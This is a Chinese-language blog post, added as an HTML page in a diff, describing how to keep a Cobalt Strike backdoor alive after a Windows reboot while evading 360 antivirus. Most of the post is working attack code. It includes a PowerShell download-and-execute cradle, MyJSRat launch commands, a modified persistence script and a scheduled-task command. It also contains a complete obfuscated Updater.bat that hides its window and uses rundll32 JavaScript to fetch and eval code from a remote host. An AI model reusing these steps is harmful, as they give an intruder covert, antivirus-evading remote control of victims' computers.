@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>cobalt strike persistence with javascript backdoor | Homaebic-Know thyself</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="web,web安全,ctf,安全">
+  
+
+  <meta name="description" content="Cobalt strike弹过来的shell重启之后shell就掉了，自然希望他可以在重启电脑之后依然发送心跳包过来，本文提供了一种cobalt strike权限维持的方法。 理论操作github上有一份cs权限维持的脚本：https://github.com/Cyri1s/cobalt-strike-persistence  脚本需要web delivery类的shell，在非管理员权限下需要调">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cobalt strike persistence with javascript backdoor">
+<meta property="og:url" content="http://hebic.me/2017/10/25/cobalt-strike-persistence-with-javascript/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="Cobalt strike弹过来的shell重启之后shell就掉了，自然希望他可以在重启电脑之后依然发送心跳包过来，本文提供了一种cobalt strike权限维持的方法。 理论操作github上有一份cs权限维持的脚本：https://github.com/Cyri1s/cobalt-strike-persistence  脚本需要web delivery类的shell，在非管理员权限下需要调">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-10-25T14:17:22.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cobalt strike persistence with javascript backdoor">
+<meta name="twitter:description" content="Cobalt strike弹过来的shell重启之后shell就掉了，自然希望他可以在重启电脑之后依然发送心跳包过来，本文提供了一种cobalt strike权限维持的方法。 理论操作github上有一份cs权限维持的脚本：https://github.com/Cyri1s/cobalt-strike-persistence  脚本需要web delivery类的shell，在非管理员权限下需要调">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+</html>
+<body>
+
+
+  
+
+  <div class="post-header">
+   
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#理论操作"><span class="toc-text">理论操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#具体操作"><span class="toc-text">具体操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-cobalt-strike-persistence-with-javascript" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">cobalt strike persistence with javascript backdoor</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2017.10.25</span>
+      </span>
+
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://hebic.me/2017/10/25/cobalt-strike-persistence-with-javascript/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>Cobalt strike弹过来的shell重启之后shell就掉了，自然希望他可以在重启电脑之后依然发送心跳包过来，本文提供了一种cobalt strike权限维持的方法。</p>
+<h1 id="理论操作"><a href="#理论操作" class="headerlink" title="理论操作"></a>理论操作</h1><p>github上有一份cs权限维持的脚本：<a href="https://github.com/Cyri1s/cobalt-strike-persistence" target="_blank" rel="noopener">https://github.com/Cyri1s/cobalt-strike-persistence</a>  脚本需要web delivery类的shell，在非管理员权限下需要调用powershell，360均弹窗提示有风险操作，因此得找一种方法绕过360。在<a href="http://www.91ri.org/15051.html" target="_blank" rel="noopener">http://www.91ri.org/15051.html</a> 中，作者使用rundll32.exe调用javascript来生成一个后门。在server上测试使用这个方法依然不会触发360的主动防御，所以利用github的权限维持脚本调用rundll32.exe生成cs的后门就是本文的思路。</p>
+<p>下一步就是如何使用rundll32.exe生成cs后门，这里我修改了一下Evi1cg师傅的脚本（<a href="https://github.com/Ridter/MyJSRat" target="_blank" rel="noopener">https://github.com/Ridter/MyJSRat</a> ),让rundll32.exe运行cs的web delivery，让接受到的shell自动执行命令，cs就可以接收到了。</p>
+<h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><p>以下是操作详情：</p>
+<p>在cobalt strike中使用scripted web delivery，复制其中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX ((new-object net.webclient).downloadstring(&apos;http://8.8.8.8/a&apos;))</span><br></pre></td></tr></table></figure>
+<p>保存为temp，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat temp | iconv --to-code UTF-16LE |base64</span><br></pre></td></tr></table></figure>
+<p>复制得到的base64编码，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python MyJSRat.py -i 8.8.8.8 -p 6666 -c &quot;powershell -ep bypass -enc 复制的base64&quot;</span><br></pre></td></tr></table></figure>
+<p>或者保存到autorun.sh，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./autorun.sh &amp;</span><br></pre></td></tr></table></figure>
+<p>如果有些红红绿绿的东西出现而且没有退出python，说明启动成功了。</p>
+<p>下载cobalt-strike-persistence，修改uploadPSpayload函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub uploadPSpayload &#123;</span><br><span class="line">    foreach $site (sites()) &#123;</span><br><span class="line">       if ($site[&apos;Description&apos;] eq &quot;Scripted Web Delivery (powershell)&quot;)&#123;</span><br><span class="line">           $downloadstring = &quot;http://&quot; . $site[&apos;Host&apos;] . &quot;:&quot; . $site[&apos;Port&apos;] . $site[&apos;URI&apos;];</span><br><span class="line">           # $data = &quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(\&apos;&quot; . $downloadstring . &quot;\&apos;))\&quot;&quot;;</span><br><span class="line">           $data = &quot;@echo off%\r\nif \&quot;%1\&quot; == \&quot;h\&quot; goto begin\r\nmshta vbscript:createobject(\&quot;wscript.shell\&quot;).run(\&quot;C:\\Users\\Public\\Updater.bat h\&quot;,0)(window.close)&amp;&amp;exit \r\n:begin\r\nset a=rundl\r\nset b=l32.exe\r\nset c=javascr\r\nset d=ipt:\&quot;\\..\\mshtml,RunHTMLApplication\r\nset e=\&quot;;document.write();h=new\%\%20ActiveXObject(\&quot;WinHttp.WinHttpRequest.5.1\&quot;);h.Open(\&quot;GET\&quot;,\&quot;http://8.8.8.8:6666/connect\&quot;,false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new\%\%20ActiveXObject(\&quot;WScript.Shell\&quot;).Run(\&quot;cmd\r\nset f=taskkill\r\nset g=rundll32.exe\&quot;,0,true);&#125;\r\n\%a\%\%b\% \%c\%\%d\% \%e\% /c \%f\% /f /im \%g\%\r\n@exit&quot;;</span><br><span class="line">           bupload_raw($1, $payloadPath, $data);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在cobalt strike中加载脚本，在beacon中执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">persistence Add SchTasks OnIdle 1</span><br></pre></td></tr></table></figure>
+<p>就可以在client生成一个空闲1分钟执行C:\Users\Public\Updater.bat的计划任务。不用脚本，可以用shell添加计划任务。要记得把bat上传上去。</p>
+<p>Updater.bat的内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@echo off%</span><br><span class="line">if &quot;%1&quot; == &quot;h&quot; goto begin</span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;C:\Users\Public\Updater.bat h&quot;,0)(window.close)&amp;&amp;exit </span><br><span class="line">:begin</span><br><span class="line">set a=rundl</span><br><span class="line">set b=l32.exe</span><br><span class="line">set c=javascr</span><br><span class="line">set d=ipt:&quot;\..\mshtml,RunHTMLApplication</span><br><span class="line">set e=&quot;;document.write();h=new%%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://8.8.8.8:6666/connect&quot;,false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd</span><br><span class="line">set f=taskkill</span><br><span class="line">set g=rundll32.exe&quot;,0,true);&#125;</span><br><span class="line">%a%%b% %c%%d% %e% /c %f% /f /im %g%</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>此方法还有很多不完善，比如bat运行会有黑框弹出，持续半秒左右。脚本的其他功能受到阻碍，有精力可以完善此脚本。另外使用OnIdel计划任务，很久才会出现空闲。</p>
+<p>在可以命令执行的情况下，使用javascript backdoor不失为一个可以代替powershell弹cs的好方法。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/Cyri1s/cobalt-strike-persistence" target="_blank" rel="noopener">https://github.com/Cyri1s/cobalt-strike-persistence</a></p>
+<p><a href="http://www.91ri.org/15051.html" target="_blank" rel="noopener">http://www.91ri.org/15051.html</a></p>
+<p><a href="https://github.com/3gstudent/Pentest-and-Development-Tips" target="_blank" rel="noopener">https://github.com/3gstudent/Pentest-and-Development-Tips</a></p>
+<p><a href="https://github.com/Cyri1s/cobalt-strike-persistence" target="_blank" rel="noopener">https://github.com/Cyri1s/cobalt-strike-persistence</a></p>
+<p><a href="http://blog.csdn.net/carl6148/article/details/7905549" target="_blank" rel="noopener">http://blog.csdn.net/carl6148/article/details/7905549</a></p>
+
+    
+  </div>
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2017/10/16/hack-dat-kiwi-2017-writeup/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2017/10/28/Windows-Kerberos-认证笔记/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_self">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'http://hebic.me/2017/10/25/cobalt-strike-persistence-with-javascript/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+
+
+
+    
+
+    
+	
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
